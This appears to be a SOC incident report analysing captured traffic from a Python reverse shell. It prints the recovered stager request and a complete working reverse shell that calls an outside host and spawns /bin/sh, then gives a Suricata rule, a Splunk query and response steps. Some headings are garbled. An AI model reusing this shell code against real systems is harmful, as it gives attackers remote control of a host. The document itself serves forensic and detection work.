# Scenario 04: Network Forensics & Python Reverse Shell Analysis

## 📌 Executive Summary
This report details an investigation into suspicious outbound network traffic detected from an internal database server (10.0.2.15) toward an external untrusted IP address (198.51.100.44) over non-standard port 4444. Forensic packet analysis using Wireshark and TShark revealed an active Python Reverse Shell session established after fetching an initial payload via an automated Python script.

---

## 🔍 Phase 1: Packet Capture & Traffic Triage (CLI & GUI Analysis)
An initial evaluation of packet volume and protocol distribution was conducted using tshark CLI filtering to assess the scope of the outbound anomaly.

### Traffic Summary:
| Source IP | Destination IP | Dest Port | Protocol | Packet Count | Total Bytes | Risk Level |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 10.0.2.15 | 198.51.100.44 | 4444 | TCP | 142 | 85,400 B | 🔴 CRITICAL |
| 10.0.2.15 | 192.168.1.1 | 53 | DNS | 12 | 1,200 B | 🟢 Normal |
| 10.0.2.15 | 10.0.2.1 | 80 | HTTP | 4 | 1,500 B | 🟢 Normal |

> Key Observation: Port 4444 is a notorious default port associated with Metasploit and various interactive reverse shell listeners. A high volume of 142 packets (85KB) confirms an active, interactive session rather than a simple connection probe.

---

## 🧪 Phase 2: TCP Stream Reassembly & Payload Deconstruction

Reconstructing the raw TCP stream of the suspicious session exposed two distinct stages of the attack: payload retrieval and reverse shell execution.

### Stage 1: Initial Stager Download
GET /shell.py HTTP/1.1
Host: 198.51.100.44:4444
User-Agent: Python-urllib/3.9
* User-Agent Analysis: The presence of Python-urllib/3.9 indicates automated script execution on the victim host, bypassing traditional browser interaction to fetch the malicious script shell.py.

### Stage 2: Reverse Shell Execution Payload
import socket, subprocess, os

# 1. Initiate Outbound Socket Connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("198.51.100.44", 4444))

# 2. File Descriptor Duplication (STDIN, STDOUT, STDERR Redirection)
os.dup2(s.fileno(), 0) # Redirect Input
os.dup2(s.fileno(), 1) # Redirect Output
os.dup2(s.fileno(), 2) # Redirect Errors

# 3. Spawn Interactive Shell
p = subprocess.call(["/bin/sh", "-i"])
### Deconstruction ("Code Intuition" / فراسة الكود):
* **os.dup2() Mechanism:** Binds the Linux standard streams (input, output, error) to the active network socket. Any command sent by the attacker over the TCP connection is directly executed by /bin/sh, and the command outputs are returned back over the socket connection invisible to local console viewersWhy Reverse Shell?l?** Outbound connections exploit relaxed egress firewall rules, allowing attackers to establish interactive access even when inbound ports are strictly locked down.

---

## 🛡️ Phase 3: Incident Response & Mitigation (NIST Framework)

To immediately halt the active intrusion and prevent lateral movement, a two-tiered response strategy was executed:

### 1. Network Level ActionImmediate IP Blocking:g:** Applied firewall drop rules for remote host 198.51.100.44Strict Egress Filtering:g:** Configured default-deny egress policies on non-standard ports (specifically blocking outbound TCP 4444 and unauthorized high ports).

### 2. Host Level ActionNetwork Isolation:n:** Isolated server 10.0.2.15 from the internal network segment to prevent lateral movementProcess Termination:n:** Killed active python and /bin/sh process trees associated with socket handlesPost-Exploitation Forensics:s:** Collected volatile memory (RAM) and audited .bash_history alongside system audit logs to measure exfiltration impact.

---

## 🎯 Phase 4: Behavioral Detection Engineering

To detect similar reverse shell activities across enterprise environments, both IDS signatures and SIEM SPL queries were developed.


### 1. Suricata IDS Rule (Network Intrusion Detection)
alert tcp $HOME_NET any -> $EXTERNAL_NET 4444 (msg:"SEC-ALERT: Outbound Python Reverse Shell Activity Detected"; flow:to_server,established; content:"/bin/sh"; content:"os.dup2"; reference:url,github.com/AHMAD9ALKASAB/SOC-Incident-Reports; classtype:trojan-activity; sid:1000004; rev:1;)
### 2. Splunk SPL Query (Egress Anomaly Detection)
index=network_traffic dest_port=4444 OR (dest_port>=4000 AND dest_port<=4500)
| stats count as packet_count, sum(bytes) as total_bytes, values(app) as applications by src_ip, dest_ip, dest_port
| where total_bytes > 50000
| eval threat_description="Potential Interactive Reverse Shell Session"
| table src_ip, dest_ip, dest_port, packet_count, total_bytes, threat_description
---

## 💡 Philosophy: "Code Intuition" (فراسة الكود)
Detecting a reverse shell requires looking beyond port numbers. Understanding how low-level system calls like dup2() hijack process streams enables detection engineers to build rules that catch malicious behavior regardless of obfuscation or port changes.



